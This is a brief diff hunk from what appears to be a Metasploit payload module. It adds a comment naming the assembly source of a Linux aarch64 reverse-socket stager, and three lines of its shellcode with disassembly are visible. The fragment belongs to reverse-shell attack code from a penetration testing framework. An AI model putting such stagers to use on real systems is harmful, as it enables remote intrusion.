@@ -38,6 +38,7 @@ module MetasploitModule
             },
           'Payload' =>
           [
+            # Generated from external/source/shellcode/linux/aarch64/stager_sock_reverse.s
             0xd2800040,          #  mov	x0, #0x2                   	// #2
             0xd2800021,          #  mov	x1, #0x1                   	// #1
             0xd2800002,          #  mov	x2, #0x0                   	// #0
